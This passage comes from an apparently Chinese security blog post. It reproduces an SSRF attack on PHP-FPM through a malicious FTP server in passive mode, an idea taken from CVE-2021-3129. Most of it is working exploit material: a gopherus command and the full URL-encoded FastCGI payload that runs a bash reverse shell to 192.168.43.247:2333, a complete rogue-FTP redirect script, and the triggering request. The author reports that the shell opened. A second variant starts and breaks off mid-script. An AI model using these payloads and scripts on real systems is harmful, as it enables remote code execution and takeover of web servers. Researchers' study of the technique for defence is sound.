class="token operator">%</span>2F1<span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">%</span>250E<span class="token operator">%</span>2502CONTENT_LENGTH54<span class="token operator">%</span>250E<span class="token operator">%</span>2504REQUEST_METHODPOST<span class="token operator">%</span>2509KPHP_VALUEallow_url_include<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span>2520On<span class="token operator">%</span>250Adisable_functions<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>250Aauto_prepend_file<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>253D<span class="token operator">%</span>2520php<span class="token operator">%</span>253A<span class="token operator">%</span>2F<span class="token operator">%</span>2Finput<span class="token operator">%</span>250F<span class="token operator">%</span>2517SCRIPT_FILENAME<span class="token operator">%</span>2Fvar<span class="token operator">%</span>2Fwww<span class="token operator">%</span>2Fhtml<span class="token operator">%</span>2Findex<span class="token punctuation">.</span>php<span class="token operator">%</span>250D<span class="token operator">%</span>2501DOCUMENT_ROOT<span class="token operator">%</span>2F<span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">2505</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2501</span><span class="token operator">%</span><span class="token number">25006</span><span class="token operator">%</span><span class="token number">2504</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span>253C<span class="token operator">%</span>253Fphp<span class="token operator">%</span>2520system<span class="token operator">%</span><span class="token number">2528</span><span class="token operator">%</span>2527id<span class="token operator">%</span><span class="token number">2527</span><span class="token operator">%</span><span class="token number">2529</span><span class="token operator">%</span>253Bdie<span class="token operator">%</span><span class="token number">2528</span><span class="token operator">%</span><span class="token number">2527</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Made<span class="token operator">-</span>by<span class="token operator">-</span>SpyD3r<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">%</span>250A<span class="token operator">%</span><span class="token number">2527</span><span class="token operator">%</span><span class="token number">2529</span><span class="token operator">%</span>253B<span class="token operator">%</span>253F<span class="token operator">%</span>253E<span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span><span class="token operator">%</span><span class="token number">2500</span></pre></td></tr></table></figure><p>如下图所示，命令执行成功：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0a4f485c3adf628210a4bbfd92d217901de09394.png" alt="image-20210501213753652" /></p>
<h2 id="ftp-ssrf-攻击-fpmfastcgi"><a class="anchor" href="#ftp-ssrf-攻击-fpmfastcgi">#</a> FTP - SSRF 攻击 FPM/FastCGI</h2>
<p>这是在之前复现 Laravel Debug mode RCE（CVE-2021-3129）漏洞时学到的一个思路。该漏洞的核心就是传入 file_get_contents () 和 file_put_contents () 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到 RCE 的效果。</p>
<p>漏洞代码大致可以简化为如下代码：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'viewFile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'viewFile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></pre></td></tr></table></figure><p>可以看到这里主要功能点是：读取一个给定的路径  <code>$_GET['viewFile']</code> ，之后写回文件中  <code>$_GET['viewFile']</code> ，这相当于什么都没有做！</p>
<p>由于我们可以运行 file_get_contents () 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送 HTTP 请求来扫描常用端口。假设此时我们发现目标正在监听 9000 端口，则很有可能目标主机上正在运行着 PHP-FPM，我们可以进一步利用该漏洞来攻击 PHP-FPM。</p>
<p>众所周知，如果我们能向 PHP-FPM 发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与 gopher:// 协议结合使用，curl 支持 gopher:// 协议，但 file_get_contents 却不支持。</p>
<p>另一个已知的允许通过 TCP 发送二进制数据包的协议是 FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从 FTP 服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个有服务端指定的 IP 和端口上。而且，这里对这些 IP 和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p>
<p>现在，如果我们尝试使用  <code>viewFile=ftp://evil-server/file.txt</code>  来利用这个漏洞，会发生以下情况：</p>
<ul>
<li>首先通过 file_get_contents () 函数连接到我们的 FTP 服务器，并下载 file.txt。</li>
<li>然后再通过 file_put_contents () 函数连接到我们的 FTP 服务器，并将其上传回 file.txt。</li>
</ul>
<p>现在，你可能已经知道这是怎么回事：我们将使用 FTP 协议的被动模式让 file_get_contents () 在我们的服务器上下载一个文件，当它试图使用 file_put_contents () 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成 SSRF 了。</p>
<p>下面我们来演示一下攻击过程。</p>
<p>首先，我们使用 gopherus 生成攻击 fastcgi 的 payload：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python gopherus.py <span class="token parameter variable">--exploit</span> fastcgi</pre></td></tr><tr><td data-num="2"></td><td><pre>/var/www/html/index.php  <span class="token comment"># 这里输入的是目标主机上一个已知存在的 php 文件</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i >&amp; /dev/tcp/192.168.43.247/2333 0>&amp;1"</span>  <span class="token comment"># 这里输入的是要执行的命令</span></pre></td></tr></table></figure><p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c69636d75fa8aee070b13c9b176d0946692d156c.png" alt="image-20210501221742319" /></p>
<p>得到 payload，而我们需要的是上面 payload 中  <code>_</code>  后面的数据部分，即：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>0F<span class="token operator">%</span>10SERVER_SOFTWAREgo<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">%</span>20fcgiclient<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0B<span class="token operator">%</span>09REMOTE_ADDR127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>0F<span class="token operator">%</span>08SERVER_PROTOCOLHTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token operator">%</span>0E<span class="token operator">%</span>03CONTENT_LENGTH106<span class="token operator">%</span>0E<span class="token operator">%</span>04REQUEST_METHODPOST<span class="token operator">%</span>09KPHP_VALUEallow_url_include<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20On<span class="token operator">%</span>0Adisable_functions<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>0Aauto_prepend_file<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20php<span class="token operator">%</span>3A<span class="token operator">//</span><span class="token builtin">input</span><span class="token operator">%</span>0F<span class="token operator">%</span>17SCRIPT_FILENAME<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">%</span>0D<span class="token operator">%</span>01DOCUMENT_ROOT<span class="token operator">/</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token number">00j</span><span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>3C<span class="token operator">%</span>3Fphp<span class="token operator">%</span>20system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>22bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.43</span><span class="token number">.247</span><span class="token operator">/</span><span class="token number">2333</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bdie<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Made<span class="token operator">-</span>by<span class="token operator">-</span>SpyD3r<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">%</span>0A<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span>3F<span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span></pre></td></tr></table></figure><p>在攻击机上设置好 nc 监听：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-85c7ce1c61dd02ed50171ea47d58a321f08612aa.png" alt="image-20210501221857026" /></p>
<p>然后编写如下脚本（脚本是从网上扒的，谁叫我菜呢，大佬勿喷～～），在攻击机上搭建一个恶意的 ftp 服务，并将上面的 payload 中的数据替换掉下面 ftp 脚本中的 payload 的内容：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># @Time    : 2021/1/13 6:56 下午</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># @Author  : tntaxin</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># @File    : ftp_redirect.py</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># @Software:</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 对 gopherus 生成的 payload 进行一次 urldecode</span></pre></td></tr><tr><td data-num="11"></td><td><pre>payload <span class="token operator">=</span> unquote<span class="token punctuation">(</span><span class="token string">"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span></pre></td></tr><tr><td data-num="15"></td><td><pre>port <span class="token operator">=</span> <span class="token number">23</span></pre></td></tr><tr><td data-num="16"></td><td><pre>sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment"># ftp 被动模式的 passvie port, 监听到 1234</span></pre></td></tr><tr><td data-num="21"></td><td><pre>sk2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>sk2<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>sk2<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment"># 计数器，用于区分是第几次 ftp 连接</span></pre></td></tr><tr><td data-num="26"></td><td><pre>count <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    conn<span class="token punctuation">,</span> address <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"200 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># USER aaa\r\n  客户端传来用户名</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"220 ready\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"200 ready\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I 表示二进制， TYPE A 表示文本</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"215 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"200 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># SIZE /123\r\n  客户端询问文件 / 123 的大小</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"213 3 \n"</span><span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"300 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># EPSV\r\n'</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"200 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"227 127,0,0,1,4,210\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 服务端告诉客户端需要到哪个 ip:port 去获取数据，ip,port 都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"227 127,0,0,1,35,40\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 端口计算规则：35*256+40=9000</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 第一次连接会收到命令 RETR /123\r\n，第二次连接会收到 STOR /123\r\n</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"125 \n"</span><span class="token punctuation">)</span> <span class="token comment"># 告诉客户端可以开始数据连接了</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token comment"># 新建一个 socket 给服务端返回我们的 payload</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"建立连接!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        conn2<span class="token punctuation">,</span> address2 <span class="token operator">=</span> sk2<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>        conn2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        conn2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"断开连接!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"150 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"226 \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    count <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr></table></figure><p>运行上述脚本，一个恶意 ftp 服务就起来了：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f9a98f501b2ebada6cdce4ccea47c4428a99b309.png" alt="image-20210501222030292" /></p>
<p>这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。</p>
<p>最后，构造如下请求，触发攻击：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">/</span>ssrf<span class="token punctuation">.</span>php?viewFile<span class="token operator">=</span>ftp<span class="token punctuation">:</span><span class="token operator">//</span>aaa@<span class="token number">192.168</span><span class="token number">.43</span><span class="token number">.247</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token operator">/</span><span class="token number">123</span></pre></td></tr></table></figure><p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b0f0e0171f67a32707b60cd2b0542509c0cfb91.png" alt="image-20210501222311541" /></p>
<p>成功反弹 shell：</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-46d601452d49921a83fc4d5c027d4532a7c00d86.png" alt="image-20210502091431248" /></p>
<p>假设有以下代码：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></pre></td></tr></table></figure><p>经测试目标主机的 9000 端口上存在 PHP-FPM ，那我们便可以利用与刚才相似的原理，通过搭建恶意的 ftp 服务器来攻击 PHP-FPM。</p>
<p>首先还是使用 gopherus 生成 payload：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>python gopherus.py <span class="token parameter variable">--exploit</span> fastcgi</pre></td></tr><tr><td data-num="2"></td><td><pre>/var/www/html/index.php  <span class="token comment"># 这里输入的是目标主机上一个已知存在的 php 文件</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i >&amp; /dev/tcp/192.168.43.247/2333 0>&amp;1"</span>  <span class="token comment"># 这里输入的是要执行的命令</span></pre></td></tr></table></figure><p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c69636d75fa8aee070b13c9b176d0946692d156c.png" alt="image-20210501221742319" /></p>
<p>得到的 payload 只截取  <code>_</code>  后面的数据部分。</p>
<p>然后再攻击机上执行以下 python 脚本搭建一个恶意的 ftp 服务器：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> socket</pre></td></tr><tr><td data-num="2"></td><td><pre>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#Service ready for new user.</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#Client send anonymous username</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#USER anonymous</span></pre></td></tr><tr><td data-num="10"></td><td><pre>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the 